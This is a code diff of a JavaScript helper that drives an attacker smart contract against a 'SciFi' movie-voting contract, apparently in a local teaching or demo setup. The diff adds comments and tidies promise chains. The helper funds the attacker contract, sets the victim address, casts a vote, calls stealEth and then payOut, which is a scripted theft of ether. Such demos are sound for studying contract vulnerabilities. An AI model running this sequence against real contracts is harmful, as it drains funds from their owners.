@@ -1,9 +1,12 @@
 class AttackerHelper {
+	
 	constructor(AttackerContract, sciFiContract) {
 		this.attackerContract = AttackerContract;
 		this.sciFiContract = sciFiContract;
 	}
 
+	// Attack function
+	// @TODO: break this beast up
 	attackSciFi(web3, movieData) {
 		return new Promise((resolve, reject) => {
 			const {attackerContract, sciFiContract} = this;
@@ -22,17 +25,20 @@ class AttackerHelper {
 					SciFiInstance = instance
 					return attackerContract.deployed().then((instance) => {
 						AttackerInstance = instance
-
+						// this funds the attacker contract
 						return AttackerInstance.fundMe({from: accounts[0], gas:200000, value: web3.toWei(5,'ether')
 						})
-						.then((result) => {
+						.then(() => {
+							// this sets the victim contract address
 							return AttackerInstance.setSciFiAddress(SciFiInstance.address, {from: accounts[0], gas:200000})
 						})
-						.then((result) => {
-							return AttackerInstance.vote(hexMovieName, web3.toWei(5,'ether'),{from: accounts[0], gas:200000}).then((result) => {
-								return AttackerInstance.stealEth({from: accounts[0], gas:200000}).then((result) => {
-									return AttackerInstance.payOut(accounts[0],{from: accounts[0], gas:200000}).then((result) => {
-									})
+						.then(() => {
+							// vote from the contract
+							return AttackerInstance.vote(hexMovieName, web3.toWei(5,'ether'),{from: accounts[0], gas:200000}).then(() => {
+								// steal all the things
+								return AttackerInstance.stealEth({from: accounts[0], gas:200000}).then(() => {
+									// pay out user
+									return AttackerInstance.payOut(accounts[0],{from: accounts[0], gas:200000})
 									.then(() => {
 										resolve();
 									})
